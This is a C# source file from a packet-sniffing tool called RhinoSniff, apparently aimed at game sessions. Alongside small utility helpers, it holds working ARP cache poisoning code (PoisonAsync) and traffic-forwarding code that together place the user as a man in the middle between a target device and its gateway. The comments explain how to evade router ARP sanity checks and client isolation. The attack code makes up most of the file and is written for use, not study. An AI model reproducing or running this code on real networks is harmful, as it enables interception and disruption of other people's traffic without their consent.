using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using RhinoSniff.Interfaces;
using RhinoSniff.Models;
using PacketDotNet;
using SharpPcap.Npcap;

namespace RhinoSniff
{
    public static class Extensions
    {
        public static async Task<bool> CheckAndForwardPacketAsync(Packet packet, NpcapDevice device,
            PhysicalAddress targetPhysicalAddress, PhysicalAddress realGatewayAddress)
        {
            try
            {
                if (!device.Opened)
                    device.Open();

                var ethPacket = packet.Extract<EthernetPacket>();

                if (ethPacket == null || device.MacAddress == null) return false;

                // Only forward packets FROM the target (spoofed device)
                if (!ethPacket.SourceHardwareAddress.ToString().Contains(targetPhysicalAddress.ToString()))
                    return false;

                // Rewrite destination MAC to the real gateway so the packet actually gets routed
                ethPacket.DestinationHardwareAddress = realGatewayAddress;

                // Actually send the modified packet back out — this is what was missing
                device.SendPacket(ethPacket);

                return true;
            }
            catch (Exception e)
            {
                await e.AutoDumpExceptionAsync();
                return false;
            }
        }

        public static bool CheckRemoteAddr(this string remoteAddr)
        {
            if (IPAddress.TryParse(remoteAddr, out var address))
                return address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork ||
                       address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6;
            return false;
        }

        public static async void CopyToClipboard(this string text)
        {
            try
            {
                Clipboard.SetText(text);
            }
            catch (Exception ex)
            {
                await ex.AutoDumpExceptionAsync();
                MessageBox.Show($"Failed to copy to clipboard\n\nWhat happened: {ex.Message}", "RhinoSniff",
                    MessageBoxButton.OK, MessageBoxImage.Warning);
            }
        }

        public static AddressFamily GetAddressFamily(this NpcapDevice device)
        {
            string interfaceLocalAddress;
            if (device.Addresses.Any())
            {
                interfaceLocalAddress = device.Addresses.First().Addr.ToString();
                if (interfaceLocalAddress == "0.0.0.0") return AddressFamily.Null;
            }
            else
            {
                return AddressFamily.Null;
            }

            if (string.IsNullOrWhiteSpace(interfaceLocalAddress)) return AddressFamily.Null;
            return interfaceLocalAddress.Contains(':') ? AddressFamily.IPv6 : AddressFamily.IPv4;
        }

        public static Version GetRhinoSniffVersion(this Assembly assembly)
        {
            var fvi = FileVersionInfo.GetVersionInfo(assembly.Location);
            return Version.Parse(fvi.FileVersion);
        }

        public static string GetRhinoSniffVersionString(this Assembly assembly)
        {
            var fvi = FileVersionInfo.GetVersionInfo(assembly.Location);
            return fvi.FileVersion.Replace(".0", "");
        }

        public static async Task<bool> AutoDumpExceptionAsync(this Exception exception)
        {
            return await Globals.Container.GetInstance<IErrorLogging>().WriteToLogAsync(
                $"Exception thrown on {exception.Source} at {exception.TargetSite}: {exception.Message}. Trace:\n\n{exception.StackTrace}\r\n",
                LogLevel.ERROR);
        }
        
        public static async Task PoisonAsync(this NpcapDevice device, IPAddress targetAddress,
            PhysicalAddress targetMac, IPAddress gatewayIpAddress, PhysicalAddress gatewayMacAddress)
        {
            try
            {
                if (!device.Opened)
                    device.Open();
                if (device.MacAddress == null || targetAddress == null || targetMac == null ||
                    gatewayIpAddress == null || gatewayMacAddress == null) return;

                // Direction 1: Tell the TARGET that WE are the GATEWAY.
                // Unicast to the target's MAC since we know it specifically.
                // Using ArpOperation.Request — modern routers/OSes aggressively filter unsolicited
                // ARP replies but accept requests because the receiver updates its cache from the
                // sender_ip/sender_mac fields as a side effect of processing the request.
                // CRITICAL: Target Hardware Address in the ARP PAYLOAD must be 00:00:00:00:00:00
                // for a Request per RFC 826 ("the target's hardware address is the unknown one
                // we're asking for"). Filling it with the actual MAC makes the packet look
                // malformed and some home routers / firewalls with ARP sanity checks drop it
                // silently, which is exactly the "gateway never accepts our poison" symptom.
                // The outer Ethernet frame still carries the real dst MAC so the frame is
                // delivered; only the ARP payload's target field is zeroed.
                var zeroMac = PhysicalAddress.Parse("00-00-00-00-00-00");
                ArpPacket arpToTarget = new(ArpOperation.Request, zeroMac, targetAddress,
                    device.MacAddress, gatewayIpAddress);
                EthernetPacket ethToTarget = new(device.MacAddress, targetMac, EthernetType.Arp)
                {
                    PayloadPacket = arpToTarget
                };

                // Direction 2: Tell the GATEWAY that WE are the TARGET.
                // BROADCAST (FF:FF:FF:FF:FF:FF) at Ethernet layer — ensures APs with proxy ARP,
                // client isolation, or broadcast-only ARP learning still pick it up. ARP payload
                // Target Hardware Address is also zeroed as this is a Request.
                var broadcastMac = PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF");
                ArpPacket arpToGateway = new(ArpOperation.Request, zeroMac, gatewayIpAddress,
                    device.MacAddress, targetAddress);
                EthernetPacket ethToGateway = new(device.MacAddress, broadcastMac, EthernetType.Arp)
                {
                    PayloadPacket = arpToGateway
                };

                // Fire both directions in parallel — minimizes the window where either side has
                // a stale cache. Sequential sends leave a gap where target's cache is poisoned
                // but gateway's isn't (or vice versa), causing one-way forwarding which is what
                // kills game sessions.
                await Task.WhenAll(
                    Task.Run(() => device.SendPacket(ethToTarget)),
                    Task.Run(() => device.SendPacket(ethToGateway))
                );
            }
            catch (Exception e)
            {
                await e.AutoDumpExceptionAsync();
            }
        }

        /// <summary>
        /// Send CORRECT ARP mappings to both sides so their caches heal instantly instead of
        /// waiting for the natural 60s-10min ARP timeout. Called on Stop ARP so the target's
        /// game session doesn't get dropped by the post-spoof cache stale period.
        /// Fires 3 times for reliability (same as arpspoof's "unspoofing" behavior).
        /// </summary>
        public static async Task RestoreAsync(this NpcapDevice device, IPAddress targetAddress,
            PhysicalAddress targetMac, IPAddress gatewayIpAddress, PhysicalAddress gatewayMacAddress)
        {
            try
            {
                if (!device.Opened)
                    device.Open();
                if (device.MacAddress == null || targetAddress == null || targetMac == null ||
                    gatewayIpAddress == null || gatewayMacAddress == null) return;

                // Tell the TARGET: gateway's real MAC is gatewayMac.
                // Tell the GATEWAY: target's real MAC is targetMac.
                ArpPacket fixTarget = new(ArpOperation.Request, targetMac, targetAddress,
                    gatewayMacAddress, gatewayIpAddress);
                EthernetPacket ethFixTarget = new(gatewayMacAddress, targetMac, EthernetType.Arp)
                {
                    PayloadPacket = fixTarget
                };

                ArpPacket fixGateway = new(ArpOperation.Request, gatewayMacAddress, gatewayIpAddress,
                    targetMac, targetAddress);
                EthernetPacket ethFixGateway = new(targetMac, gatewayMacAddress, EthernetType.Arp)
                {
                    PayloadPacket = fixGateway
                };

                for (int i = 0; i < 3; i++)
                {
                    await Task.WhenAll(
                        Task.Run(() => device.SendPacket(ethFixTarget)),
                        Task.Run(() => device.SendPacket(ethFixGateway))
                    );
                    await Task.Delay(50);
                }
            }
            catch (Exception e)
            {
                await e.AutoDumpExceptionAsync();
            }
        }

        public static async Task<bool> ValidateIpAsync(this string ip)
        {
            try
            {
                await Dns.GetHostAddressesAsync(ip);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static string ToHex(this Color c)
        {
            return $"#{c.R:X2}{c.G:X2}{c.B:X2}";
        }
    }
}